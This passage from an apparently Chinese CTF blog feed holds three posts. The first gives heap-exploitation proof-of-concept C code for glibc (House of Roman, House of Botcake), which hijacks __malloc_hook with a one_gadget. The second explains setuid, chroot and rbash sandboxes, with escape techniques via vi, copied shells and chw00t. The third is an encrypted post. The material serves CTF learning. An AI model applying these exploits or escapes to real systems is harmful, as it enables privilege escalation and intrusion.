*(uint64_t *)((uint64_t)p) = (uint64_t *)((uint64_t)buf + 0x10); // Set Fastbin Chunk&#39;s fd = Fake Chunk2    free(q); // Trigger malloc_consolidate    *(uint64_t *)((uint64_t)buf + 0x18) = 0xa00001; // Set Fake Chunk    malloc(0xa00000);    *(uint64_t *)((uint64_t)buf + 0x18) = -0xf; // Set Fake Chunk    int offset = (uint64_t)&amp;target - ((uint64_t)buf + 0x10) - 0x20;    p = malloc(offset);    fprintf(stderr, &quot;p = malloc(offset) =&gt; %p\n&quot;, p);    void *victim = malloc(0x18);    strcpy(victim, &quot;Hacked.&quot;);    fprintf(stderr, &quot;Target: %s\n&quot;, target);    exit(0);}</code></pre><h2 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a><a href="https://github.com/romanking98/House-Of-Roman" target="_blank" rel="noopener">House of Roman</a></h2><p>Partial write to control PC. (Off by One, Fastbin Attack, Unsortedbin Attack, etc)</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#define libc_base 0x7ffff7a0d000#define __malloc_hook libc_base+0x3c4b10#define one_gadget libc_base+0xf02a4int main() {    void *p, *q, *r, *s, *u, *v;    p = malloc(0x18);    q = malloc(0xc8);    r = malloc(0x68);    *(uint64_t *)((uint64_t)q + 0x68) = 0x61;    free(q);    q = malloc(0xc8); // Get Unsortedbin addr    s = malloc(0x68);    u = malloc(0x68); // For fixing Fastbin    v = malloc(0x68); // For triggering malloc_printerr    *(uint8_t *)((uint64_t)p + 0x18) = 0x71; // Off by One    free(r);    free(s);    *(uint8_t *)((uint64_t)s) = 0x20; // Point s&#39;s fd to q    *(uint16_t *)((uint64_t)q) = (__malloc_hook - 0x23) &amp; 0xffff; // Point q&#39;s fd to `&amp;__malloc_hook - 0x23`    fprintf(stderr, &quot;malloc(0x68) =&gt; %p\n&quot;, malloc(0x68));    fprintf(stderr, &quot;malloc(0x68) =&gt; %p\n&quot;, malloc(0x68));    p = malloc(0x68); // Get the chunk @ `&amp;__malloc_hook - 0x23`    free(u);    *(uint64_t *)((uint64_t)u) = 0; // Set Fastbin&#39;s fd = 0 to fix Fastbin    q = malloc(0xc8);    fprintf(stderr, &quot;malloc(0x18) =&gt; %p\n&quot;, malloc(0x18));    free(q);    // Unsortedbin Attack    *(uint16_t *)((uint64_t)q + 0x8) = (__malloc_hook - 0x10) &amp; 0xffff; // Point q&#39;s bk to `&amp;__malloc_hook - 0x10`    fprintf(stderr, &quot;malloc(0xc8) =&gt; %p\n&quot;, malloc(0xc8));    // Partial Write one_gadget    *(uint16_t *)((uint64_t)p + 0x13) = one_gadget &amp; 0xffff;    *(uint8_t *)((uint64_t)p+ 0x15) = (one_gadget &gt;&gt; 16) &amp; 0xff;    free(v);    free(v); // Trigger malloc_printerr    exit(0);}</code></pre><h2 id="House-of-Botcake-gt-glibc-2-26"><a href="#House-of-Botcake-gt-glibc-2-26" class="headerlink" title="House of Botcake (&gt;= glibc-2.26)"></a><a href="https://raw.githubusercontent.com/shellphish/how2heap/master/glibc_2.26/house_of_botcake.c" target="_blank" rel="noopener">House of Botcake</a> (&gt;= glibc-2.26)</h2><p>Bypass double free restriction on tcache. (Double Free, Chunk Overlapping)</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;void *ptr[7];char buf[0x20];int main() {    void *p;    fprintf(stderr, &quot;target =&gt; %p\n&quot;, buf);    for (int i = 0; i &lt; 7; i++) { // Fillup Tcache        ptr[i] = malloc(0x108);    }    p = malloc(0x108);    void *victim = malloc(0x108);    malloc(0x18); // padding    for (int i = 0; i &lt; 7; i++) {        free(ptr[i]);    }    free(victim); // Add to unsortedbin    free(p); // Consolidate with victim    malloc(0x108); // get a chunk from Tcache &amp; put victim into Tcache    free(victim); // Double free    p = malloc(0x128);    *(uint64_t *)((uint64_t)p + 0x110) = buf; // Overwrite victim&#39;s fd = buf    malloc(0x108);    p = malloc(0x108);    fprintf(stderr, &quot;p = malloc(0x108) =&gt; %p\n&quot;, p);    exit(0);}</code></pre><h2 id="House-of-Corrosion"><a href="#House-of-Corrosion" class="headerlink" title="House of Corrosion"></a><a href="https://github.com/CptGibbon/House-of-Corrosion" target="_blank" rel="noopener">House of Corrosion</a></h2><p>TODO</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.youtube.com/watch?v=dooN6X28daI" target="_blank" rel="noopener">https://www.youtube.com/watch?v=dooN6X28daI</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/</a><br><a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener">https://github.com/shellphish/how2heap</a><br><a href="https://darkwing.moe/2019/07/18/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B023-heap%E4%B8%8Emalloc-1/" target="_blank" rel="noopener">https://darkwing.moe/2019/07/18/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B023-heap%E4%B8%8Emalloc-1/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;House-of-*&lt;/code&gt; 是对堆漏洞利用的一系列技术，起源于一篇叫做 Malleus Maleficarum（也有一本中世纪的时候有关女巫的条约的书叫做&lt;a href=&quot;https://en.wikipedia.org/wiki/Malleus_Maleficarum&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;女巫之槌&lt;/a&gt;）的文章。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Linux Sandbox - Setuid</title>
    <link href="blog.b3ale.cn/2020/04/23/Linux-Sandbox-Setuid/"/>
    <id>blog.b3ale.cn/2020/04/23/Linux-Sandbox-Setuid/</id>
    <published>2020-04-23T14:39:04.000Z</published>
    <updated>2020-04-24T11:47:37.960Z</updated>
    
    <content type="html"><![CDATA[<p>Yet Another Linux Sandbox Technic.</p><a id="more"></a><h1 id="Combination-Blow"><a href="#Combination-Blow" class="headerlink" title="Combination Blow"></a>Combination Blow</h1><p>Setuid Sandbox 主要是基于 Linux Kernel 所提供的安全机制（如 DAC）来实现。简单地说就是利用 <code>random uid/gid + chroot() + capability</code> 的组合出击来达到目标。其实现非常简单，无需修改 Kernel。Setuid Sandbox 的实现简单易行。在一定程度上，它可以用于隔离不可信的程序。由于它完全依赖于 kernel 所提供的安全机制，除非攻击者能找到 kernel 的 0-day 漏洞并通过攻击获得 root 权限，否则 Setuid Sandbox 所提供的安全隔离是可以保证的。</p><h2 id="What-is-setuid"><a href="#What-is-setuid" class="headerlink" title="What is setuid"></a>What is setuid</h2><p>Linux 中每个进程都会有一个 uid，<code>uid = 0</code> 则为 root 用户进程（privileged），<code>uid &gt; 0</code>则为普通用户进程（unprivileged）。不同 uid 进程之间（不包括 root 进程）是相互隔离的，各自都有自己独立的权限，互不干扰。而 root 进程具有特权，它能干任何事情。Linux uid/gid 机制主要是用于进程的权限隔离。如果你打算执行不可信的程序，那么你可以在启动该程序时为其分配一个 random uid，大概的执行流程如下：<code>fork() -&gt; setuid() -&gt; {设置相关的进程资源限制，如 RLIMIT_NPROC (0,0)} -&gt; execve()</code>。而 <code>setuid()</code> 只能由 root 权限（或拥有 <code>CAP_SETUID</code> Capability）才能成功调用，所以要顺利执行这个流程需要借助某个拥有 root 权限的进程。</p><p>Linux 下为进程设置了三个 UID：</p><ul><li>Real UID（RUID）：进程创建者的 UID，正常情况下它一直不会变化，永远表示进程创建者，但 root 用户可以更改它；</li><li>Saved UID（SUID）：拥有者可以为自己的可执行程序设置 SUID 位，设置后任何人执行程序，程序启动时都将获得程序拥有者的权限；</li><li>Effective UID（EUID）：为权限检查时实际生效的 UID，意味着在判断用户权限时并不检查 RUID 及 SUID，只看 EUID。</li></ul><p>用 <code>getresuid</code> 来获取当前用户的三个 UID：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main() {    int ruid, euid, suid;    if (getresuid(&amp;ruid, &amp;euid, &amp;suid) == 0) {        printf(&quot;RUID: %d\tEUID: %d\tSUID: %d\n&quot;, ruid, euid, suid);    } else {        ;    }    return 0;}</code></pre><p>如果为文件加上 SUID 标志位，其他用户运行该文件时会获得 root 的权限。但 RUID 保持不变：</p><pre><code class="bash">root in ~/Setuid-Sandbox λ sudo -u root ./test-uidRUID: 0    EUID: 0    SUID: 0root in ~/Setuid-Sandbox λ sudo -u www-data ./test-uidRUID: 33    EUID: 33    SUID: 33root in ~/Setuid-Sandbox λ chmod u+s ./test-uidroot in ~/Setuid-Sandbox λ ls -l ./test-uid-rwsr-xr-x 1 root root 8720 Apr 24 19:11 ./test-uidroot in ~/Setuid-Sandbox λ sudo -u www-data ./test-uidRUID: 33    EUID: 0    SUID: 0</code></pre><h2 id="What-is-chroot"><a href="#What-is-chroot" class="headerlink" title="What is chroot"></a>What is chroot</h2><p>通常来说，提到 Chroot 一般有两个含义，<code>chroot(1)</code> 是 <code>/usr/bin/chroot</code>，<code>chroot(2)</code> 是 glibc 中的一个函数。Chroot 是 Linux Kernel 提供的另一个安全功能，它用于改变进程的根目录。比如运行 <code>chroot(&quot;/tmp/sandbox/1/&quot;)</code>，会启动一个新的 Shell 并设置新进程的根目录为 <code>&quot;/tmp/sandbox/1/&quot;</code>，那么该进程的文件操作将被限制在 <code>&quot;/tmp/sandbox/1/&quot;</code> 中。注意，<code>chroot()</code> 只能由 root 权限（或拥有 <code>CAP_SYS_CHROOT</code> Capability）才能成功调用。</p><h3 id="Chroot-Command"><a href="#Chroot-Command" class="headerlink" title="Chroot Command"></a>Chroot Command</h3><p>需要静态编译 Busybox 和 Bash：</p><pre><code class="bash">$ wget$ tar -zxvf$ cd  &amp;&amp; mkdir build$ make O=build defconfig$ cd build &amp;&amp; make menuconfig # Select &quot;Build BusyBox as a static binary (no shared libs)&quot;$ make$ wget http://ftp.gnu.org/gnu/bash/bash-5.0-beta.tar.gz$ tar -zxvf bash-5.0-beta.tar.gz$ cd bash-5.0-beta &amp;&amp; ./configure --enable-static-link --without-bash-malloc$ make</code></pre><p>使用 chroot 来修改当前的根目录，可以看到 ls 的结果是不同的：</p><pre><code class="bash">root in ~/Setuid-Sandbox λ ./bashroot@iZ2zecelicizfr2e28zon3Z:~/Setuid-Sandbox# ./busybox ls /bin             etc             initrd.img.old  lost+found      opt             run             sys             varboot            home            lib             media           proc            sbin            tmp             vmlinuzdev             initrd.img      lib64           mnt             root            srv             usr             vmlinuz.oldroot@iZ2zecelicizfr2e28zon3Z:~/Setuid-Sandbox# exitexitroot in ~/Setuid-Sandbox λ chroot . ./bashbash-5.0# ./busybox ls /bash      busybox   chroot    chroot.c  lsbash-5.0# exitexit</code></pre><h3 id="Chroot-Function"><a href="#Chroot-Function" class="headerlink" title="Chroot Function"></a>Chroot Function</h3><p>进程中有 <code>cwd</code>（当前目录）和 <code>root</code>（根目录）两个目录。C 库中提供了几个函数对两者进行修改：</p><pre><code class="cpp">int chdir(const char *path);     //依据目录名改cwdint fchdir(int fd);              //依据文件描述符改cwdint chroot(const char *path);    //依据目录名改root</code></pre><pre><code class="cpp">#include &lt;unistd.h&gt;int main() {    chroot(&quot;.&quot;);    chdir(&quot;/&quot;);    char *argv[] = {&quot;./bash&quot;, NULL};    execl(argv[0], argv, NULL);    return 0;}</code></pre><h3 id="Create-bash-jail"><a href="#Create-bash-jail" class="headerlink" title="Create bash jail"></a>Create bash jail</h3><p>可以使用 <a href="https://olivier.sessink.nl/jailkit/index.html" target="_blank" rel="noopener">jailkit</a> 创建一个安全的 jail 环境：</p><pre><code class="bash">$ wget https://olivier.sessink.nl/jailkit/jailkit-2.20.tar.gz$ tar -zxvf jailkit-2.20.tar.gz$ cd jailkit-2.20 &amp;&amp; ./configure$ make$ make install</code></pre><h3 id="Combine-with-setuid"><a href="#Combine-with-setuid" class="headerlink" title="Combine with setuid"></a>Combine with setuid</h3><p>那么在前面叙述的执行流程中，可以先让具有 root 权限的进程去执行 <code>chroot()</code> 后再调用 <code>setuid() -&gt; {...} -&gt; execve()</code>。但其实这样做是行不通的，因为进程的根目录已经被修改，<code>execve()</code> 本要执行的 Binary 文件已经不可用了。Google 的一篇文章里给出了一个解决此问题的简单方法：</p><ol><li>创建一个子进程，注意使用 <code>clone()</code> 和 <code>CLONE_FS</code>，使得父子进程可以共享根目录、当前目录等等；</li><li>父进程降权后执行 <code>execve()</code>，又产生一个新进程；</li><li>然后父进程请求子进程执行 <code>chroot()</code>；</li><li>子进程执行 <code>chroot()</code>，新的根目录会对两个子进程同时生效。</li><li>父进程退出。</li></ol><p>这个方法的前提是 父进程 需要设置 <code>RLIMIT_NOFILE</code> 为 <code>(0, 0)</code>，并且对于不可信的子进程（<code>execve</code> 创建的新进程）来说，在执行第 4 步之前应是可控的。另外，对于父进程来说，由于它是以 root 身份运行，那么就可能会成为攻击点，比如 Confused Deputy Problem。</p><h2 id="Capability-Mechanism"><a href="#Capability-Mechanism" class="headerlink" title="Capability Mechanism"></a>Capability Mechanism</h2><p>Linux Capability 主要是解决 Confused Deputy Problem（如 CSRF）。Linux 支持 Capability 的主要目的是细化 root 的特权。比如拿 ping 来说，它需要使用 raw_sockets 所以需要 root 特权才能运行；如果有了 Capability 机制，由于该程序只需要一个 <code>CAP_NET_RAW</code> 的 Capability 即可运行，那么根据最小权限原则，该程序运行时可以丢弃所有多余的 Capability，以防止被误用或被攻击。所以，Capability 机制可以将 root 特权进行很好的细分。Kernel-2.6.18 起已支持 30 多种不同的 Capability，在 Kernel-2.6.24 及以上的版本中一个普通用户进程也将可以持有 Capability。</p><h2 id="What-is-rbash（Restricted-Bash）"><a href="#What-is-rbash（Restricted-Bash）" class="headerlink" title="What is rbash（Restricted Bash）"></a>What is rbash（Restricted Bash）</h2><p><code>rbash</code> 的主要作用是限制了部分 Bash 命令，会以一种受限的方式启动 Bash：</p><ol><li>只能执行当前目录下的可执行文件；</li><li>在执行命令时命令不能带 <code>/</code>；</li><li>不能改变当前工作目录；</li><li>不能更改 <code>PATH</code> 或 <code>SHELL</code> 变量；</li><li>不能使用重定向输出；</li><li>…</li></ol><pre><code class="bash">root@5b0ef65c6894:~# rbashroot@5b0ef65c6894:~# cd tmp/rbash: cd: restrictedroot@5b0ef65c6894:~# ./tmp/rp-lin-x64rbash: ./tmp/rp-lin-x64: restricted: cannot specify `/&#39; in command namesroot@5b0ef65c6894:~# export PATH=$PATH:/root/tmprbash: PATH: readonly variable</code></pre><h1 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h1><h2 id="Bypass-setuid"><a href="#Bypass-setuid" class="headerlink" title="Bypass setuid"></a>Bypass setuid</h2><p>当程序执行完高权限后使用 <code>setresuid</code> 进行降权操作，但是并未完全抹除高权限：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main() {    int ruid, euid, suid;    getresuid(&amp;ruid, &amp;euid, &amp;suid);    printf(&quot;RUID: %d\tEUID: %d\tSUID: %d\n&quot;, ruid, euid, suid);    seteuid(2333); // Modify EUID    getresuid(&amp;ruid, &amp;euid, &amp;suid);    printf(&quot;RUID: %d\tEUID: %d\tSUID: %d\n&quot;, ruid, euid, suid);    setresuid(-1, 2, -1); // unprivileged    getresuid(&amp;ruid, &amp;euid, &amp;suid);    printf(&quot;RUID: %d\tEUID: %d\tSUID: %d\n&quot;, ruid, euid, suid);    setresuid(-1, 0, -1); // Get root privilege    setresuid(123, 123, 123);    getresuid(&amp;ruid, &amp;euid, &amp;suid);    printf(&quot;RUID: %d\tEUID: %d\tSUID: %d\n&quot;, ruid, euid, suid);    return 0;}</code></pre><h2 id="Bypass-chroot"><a href="#Bypass-chroot" class="headerlink" title="Bypass chroot"></a>Bypass chroot</h2><p>Chroot 沙箱可以将进程对文件的访问限制在一个指定的目录中，但是由于 Chroot 不是一个安全的 feature，所以该沙箱可能会被逃逸出来。比如使用 <a href="https://github.com/earthquake/chw00t" target="_blank" rel="noopener"><code>chw00t</code></a>。当进程中存在文件在当前 root 目录树外，即在 jail 外，即表明越狱成功，此时的 root 就是原来文件系统的 root 了。</p><h2 id="Bypass-rbash"><a href="#Bypass-rbash" class="headerlink" title="Bypass rbash"></a>Bypass rbash</h2><p>rbash 的绕过方法也有很多，通常跟 chroot 配合使用。不过它本身对文件操作是没有限制的。可以使用 vi、vim 等命令时：</p><pre><code class="bash">root in ~/Setuid-Sandbox λ rbashroot@iZ2zecelicizfr2e28zon3Z:~/Setuid-Sandbox# vi# :set shell=/usr/bin/zsh# :shellroot in ~/Setuid-Sandbox λ lsbash  busybox  chroot  chroot.c  ls</code></pre><p>可以使用 cp、mv 等文件操作命令时：</p><pre><code class="bash">root in ~/Setuid-Sandbox λ rbashroot@iZ2zecelicizfr2e28zon3Z:~/Setuid-Sandbox# cp /usr/bin/zsh .root@iZ2zecelicizfr2e28zon3Z:~/Setuid-Sandbox# lsbash  busybox  chroot  chroot.c  ls  zshroot@iZ2zecelicizfr2e28zon3Z:~/Setuid-Sandbox# zshroot in ~/Setuid-Sandbox λ lsbash  busybox  chroot  chroot.c  ls  zsh</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.linuxidc.com/Linux/2015-02/112914.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2015-02/112914.htm</a><br><a href="https://atum.li/2017/04/25/linuxsandbox" target="_blank" rel="noopener">https://atum.li/2017/04/25/linuxsandbox</a><br><a href="https://blog.betamao.me/2019/01/31/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bchroot%E4%B8%8Erbash/" target="_blank" rel="noopener">https://blog.betamao.me/2019/01/31/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bchroot%E4%B8%8Erbash/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Yet Another Linux Sandbox Technic.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="linux" scheme="blog.b3ale.cn/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>IO_FILE in CTF</title>
    <link href="blog.b3ale.cn/2020/04/19/IO-FILE-in-CTF/"/>
    <id>blog.b3ale.cn/2020/04/19/IO-FILE-in-CTF/</id>
    <published>2020-04-19T06:44:34.000Z</published>
    <updated>2020-05-21T13:04:31.006Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Wrong password." data-whm="Wrong hash.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Need password...</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="a7a8047f096fe69370eb38dc7d0d33f860a6beb694f989e9c2655df1d63f0bd8">cc5bb3edf748867b059451f3f0d0ea801d776fb1600b1453d706e14283b3e4fc4fbba89761fcbb16db034f078ff6c0f28d7d36614c07c9897367bfcf6d29f467363092827aa236be26c65cab6509c57537e5f6f75fd5e72a6b5a75242f3f7284e3d4fee6a6325f7387b870ae9c5564f5aefb30c0bc0762ee9a014e601a94f103ac81e3f77cb727b90151da23a65ce5e603525713bcce6e1f38d4f8468ad424c7bdc0b8f7a0922ff86ea795c55fceeb3a9a56a793c25de6c35d681a3ab8909f1a3029c107d92596404a00e01fa63778bd5ebfa536dc08381ce5ac68ad8f812b2a7f9290ef22d68c7e316808d296c7599087db4a847d60ef104cf0ca8737bcc6529db9b9d83369dae6737912e6923a4143ece372d6e143ae09f850fe7c06e25a529eefef299ed9448d702e27b56eeb4608de7c1f1bceada544ba2875dfd0539c93339fefcede70b4586df23ad27d47bc40ba3680ad0fb21591686f29255b7d097dee2eaceda23245cac72d5e8c63c9632a56a618a8147f2176dd32e8babe0b199bf72f2d2fbe9227b67f81904a0a946c7e799f92ef6d891b61e0ce0db2d813cc1e29859a717ed49e8bcc9f1c8bebbc9bada9c7235b254e8e1c31926824a92d804438088ac9e646a6efb4c53314e2c91aad297662dade4b12241dbec1acbb981f8f41a09239840f21b4dba65a260a68849367291906a0d90f7fe93aefc7580ef165030ac9d1628a898d41e7189b3f5a16ad41f4c806442c698034d1db12695fec92ae9fdaa948e19e0e88d360a94dfa2f3aa29ce02db238ed9e9ab878ef5542af2cb865b9dc4e59dde897ee47fe7e15eed9e7bc8922889ba83c1f6ffa98ea097e0a3d6068600108160a7a76a65faaa5cf9587fd09d3c33ac5611d9616996677ce67e31648ca9c99c24ce5886f874356aa098a7eb3ce2ec77db207f16e72189e8c353040269d92871f60bc38a1890ddef1ea4f60ae500277743aeb1d92b4d7a01a217db4e9a8da0ec70aae10a3677a3dbf498a624ad31462ee9d04d37825cfbbd91d821ff42c0dc1e1118b0587a9f4a0e68f929b7950d4db3bed3ee79f483255e289c250ccc105f5e9d9adc7a63109b0d71ba6a95b82f18945c9d9cee69f8631a081d119bbbbb2016adb265d727999fd93d18fc7ecc4acc83c2a688022b2f496ee2326db2e35dc0029c9218817ab90c833d36d6a63a34af34d30fc41fc2de3e551c67dff915ab762917ec29441fa1f605e5791e93112aff70548aa878782b660c4a2885992048fe8dfffde34ff149dbbc01d7e46e4005c8740062f18deb24ec321692ba6dbfc88237dba2c4ded26674b982bfe9e61da7ce751f53ca5282a2c0bd0706359a3ccadaf69a9123d6267e8ac66220197cd9126a2623b1389c113b7cc205a6a9ba18f792cb755b24c05b22716f060818d937a894f734f1610cb91f4ebcdb31e6c69c97e87c2a4cec8edfc7d3b5d9b779b38cea6eba008f190d0e28127aaff7eec969900cf56c1ad9395b6e89715fdbd60e471cfecfc267eed3fb29189eadf672e5f3d1a7cec260bdff9c7b6f8120148de9d7635835591960e2e68eb15ff1265e0445611c19b780fc92fd3dc0a2fb6dd657b632a0fb1128c111bbc3bdf29c37fe00a49606bdd5b856960332f958f73b12a65eb44d8006b1f0c5b51ec3214e0dd6724123d27cb9d83898b120a25423f2da86aa17ad4b8117b5f96a6bd845bd5a0adac69ed51149cb9996681cfe0caa545787a5eb4802b2802d3f636fe3fdf0c952b83b760460b81cda66ddb9c85e02ff45b1ab62936fd212a49da0d96698952cb7747b20d0d21060c948e737cd39e9872df84933cac6c7842872ec94732521553d020d1ebb6dc4ef171ec2a7f5a375e1963996b140ddfeac7e2531666c70f727948b3e120aa1d26ead5395eb06bcdbe145667437fc28b2488bd4fc188cc9fda408825826e04df03e58bb6512778b4e4798289187ad168c0826b07b60f6acf3c36b49c6bcaae6082e0896c293719f0ff09333a99ae8ea69026d154698b3168bb9cd7b261ca4a3307bb9a718a60d916a501d540272b01a1612fbb20112fedc7e7546a30cf2db9ea4e61a42b9144acf8e49b6371659563f47dd613494f3861045cf28c62c76f61869da41578208fdede7f7719c390d4df081c12b8a0820166a0fae0e1be1eeb38de0a37375cc96abc7ebe71a3f8f46bd3cc72a23a4a11097950aa97ed990ed6341b5bd4411a684f45260363818f16c07b929bc525a8ceefbab969641cced3b01583fab05c2561f3a5691f64b3aa7138285a8b43ede865774e5300b7b60c3424fa2ce162a7c44295c904e051f07d08a8da002a65db4c4baa64396474ab57758dd38527b0dbdedd6672941bb25ff440a3456babd1230c3a0db743233a8293e880186b2e13d6f2d1349d68152e7151f0c7c04dd794dc5cfb5947f57bf44743d8e2693602605f87f057a9b2a786e8c4804a046d2f5c5ee73716fec07fd32e527457d51dd98f0eaaa340e03a46c0a6be6d8f834df36b0da185fecebaa85bace7f9323f3d528a0483444fb6e6646d9fc387828a69fc67b58ba2929a614f0529517f1e5b48a2d7105577c494da59b8dd9f676bf8c5adc70414bdd6264964c4c91e356954b84d4ab8353d504f0c85929a776d3bb637550d3b7af7ed7e0fe49f64fb27a49dc89ffe946511d713c238dc71deec532a85d26259a5ad63edc2e7e4d521d480dae15d07c32216f9dbca780df6011553e1fc8b68863d71ea16735f455714467cbd77d77044bb9b37aecdacb0e8d7ab51351a2562213febf0e30781c0c41f1224474b64680cc3344051a084cfa38ebc85f1bb4c23a2df9f08a7c2ee46a988387fa5934ddcff37935d91c47676586931e5b1062b82d1f5d1f1c4f328a24515200a082cda1787862905deabb7380eb770ddc7055a738ec713d13adfccf451ac615fb7c3eaa19105cb92a95781477936c204d1b5d1b7c3684a39d06fb0397de8c818f3afa777b7c7ecda77a4a6a9e2a8e6b13994323632bf45622f39775ffa7168e1ef4089be71fa2d4246222bb5b69e20c3ec574aba9daad415d653d1bc3e80fe325686e4d727680883e11fc1f0504c9864ccd996afce725bb9f2da04bfb70c1804fd3a41dbfb50b4ac1492cbe8c5d7c5b329ffbcdd81fceb118df1832eed5e4827477100439589b5e97a12a499695ed327792b19aa551bc8a13613223c80eda6c6b6aea835c6ec6e2d9acf92fa187d94ecc91c4cf1aa5681b6892911c0cd41bb8dee551ec1091e975789573cb0fb28e3acc1feb5d8c549ebba9c4c3b4406ff855afaa8c9968d3b1e2f9455de6b272f7cbe7c06f4c22a40560078d529ad5e34731455479ceda72a489f88ee983d919ff3716260c7236085c79d357b78d37c6771b0e5a9bbac9fa50ac8cd283d4e6485f8c1d13afa68caa7ee46257e31f16c0980e4e24242494c5f5f4f812a19a00b18a28dc78915316833ba001a654d38baa93b58c9469eb6db20f8271deb7d7a7c0ca051c8e047865f06dd5ff4b73ce3ed33f8e35dcbef996a5cd77e8a3869315829b80d29af893cc2cf6701964951f165ff1c59dd72d28c5b12321f397bfe5875e6dcef31bd488b1ab88a95ca1f5b4e4cfd10dbb40e85a27dfc02dc87cfe1849e6f10c34ca479c221c800ce94f742da10d9d872493309701181abb023903c9d135b890dc343f4fc7ce520b8c59e22b3465da694362cc714fab79196e6c835115bde438da12bdea9dacbc4021320bd6c4cd9c08d20228eecc1899875873c93b9d64b267d1a80e7140ef0349e8cc0e7ea60304a1231fc82e0113b6879e738ff205551e38b590348ad81b4a439fb9eb68f17a08ad082a455c9c1297815603e615b3f8cc3c754df2592d27f38be89c27a126218f21e6dbdc36959226f5a0cd936e92a09ea9d58baca2e9443ddbb48b36941fd61c3a58c66e56a55dc6f61c2a64719005148cc81c1e6b56c048e1dcc1fbed76f4cb7faf1eea6324dc4640a0f7833d1ed821c2d7df48044aad16cf689f537134e97257d388da76e65bc6e2f743e721c8e829e57369830372dc45b807df9494a572291f35364263ada556a8d2585e0334b84374b9560ea30edd0a6c7c57ff031365fcb07e4609a0ced4e05022e572c1f64d3ef4c577c613be13f2e363ed854d94f5e3c6eb7ced3ad49cc0f496945f0c67ca7f4a1bc165f90890397be6097da5c1b94aaa81aa110516fff0f87a010790abaffd07a512475a2e3c6c57caa37c5e8b2a0ecf7091dc5c87e4779a6a761c104337bc82dbce85ef973a2c62800abe34eadae2b58db82da4a0db93bb876161077a89c874d94cf0d9554216e8d438c0b479b7efb403ddd92e57cb26d4ef23e027be18be76ff304822eafa23f54cfaccd0673465f12598ed758892714fe72c7b644e1874c88d60cb209f3a354f1c4832c7b6b33bb458f236ad1968224df808f15db34980df104d50f59c37f731c6055f22069c01ac079567211f7a1827c8a4ef88429d361368cdf944d859ac1ba35109607011303f0716ee7a926deee5cc5c4b02933824c44d38a97e44c5489bb9e328972db10de0d404d959ca524cfd94f724c6efa7d6931100d2337a6849e8a9e1494f66b69d79e42bf1b739dd17112bfeb23e0e3bb2756a7211030051866163684c54fc133b86f73138636377b90231097eb026841b3dbe2df2082c02fef5204aa0d15a23971217a6395640328e7d3b9816d5195b9bd6cc8ee4d6afa4205184816d18cec8ca2723273149d3627f635128d2bc0d45f7f0a4eb2b8e2c87f7a51ed702046ce6919904b75ed2dc78b555b521adec8ef196d80a45e4ec9c50f09ef097c62581ab2efb0a511cd4a1502bd6b0044f094ba72b8e23ca263dcbc79d5f90a727a2f4d1797bdb14d060041f0732a2bb75db5264a7fcf2f8b0a124afa49256cad08aa21b78ff87a88285f16c9d0cc28b4305d15ecde12254c915cb1b549f4d504eba1fd63c53fbd70913cf5eb55471fc6c348e87f0fe2b40da418a8706b4686bfeb343528e7b047844c93186a8e182f6a478240ca0ea41eff582f696428fc9a6e237954b3d8d4d814987fac3abf964a635bffe6dd4b6a3ea3ddf1c81fdb1a047d5cf70638ce89d44aff87d8e04fd26c8ab0dcb145a39245232609ef7d95780da599d8447be6bae2b72856db12877319f61df6eb9609bd2c2e9fce477c547f723cad8f5a0be136f872398aff9b830ef65ca3ba4c4642ec925be8b8ced33eb1611f668aaef8a7ce8c0e7d1d32750e27a31aa744d8048ede04146d7e8b31996ac6e157e6396b00aad74bf684ba9b2fca01c71abab26b779903cae8579e650b0cd5401b407e52c974c58e8afb87edeb0915df3051fa6ef156d97b007e032b802bca3556463b8dbb9b77888113ba1428922e7d2de6677431e380ec7f931751a490f56fbff67b085dc29e9ef6af63ad89d57aeb8366649904931080498b7de4aa12a35ec98e1c5e2eefd665d399b9dee151554ac453a65767b8bffe767d3df366734358fa15bf3c37e9d3dde7f8595ef5480b9227fbc45f86a0c00126cb3f6db7f2de2beceb531f7a4416bbd03a973f06404b51bfb0f99f96bc1a4b315d6b1d1dcb3e8e2bcd7833fdf695e2da88dabf6ccf18010299feafa291a0eba07be74c3fe07e39db3ae735cded6f58c68058a86744ab43c79bee9ad4d977cc9733ad9655487de38afdab4bf3ec40a2d0eb5e1f700fc6a18c747b758859c85791a1afc714e7feacd42d2a3e8f8991768f19ccadcedf2bae0d9d88c524b1a039a33c3c4fe80298e6095d791dacce163fef7ae0f29865ea738bc7af327b2f0160385a64c4a9a671b53652f776a3f8c85a745b3544fec076980f7ef48c33ae3c1573510fb0aa8692da2fb1ba7e4ce7fd52a36bee5586adb0c8ad7353af59127871b9c4678b77172b2d4a7252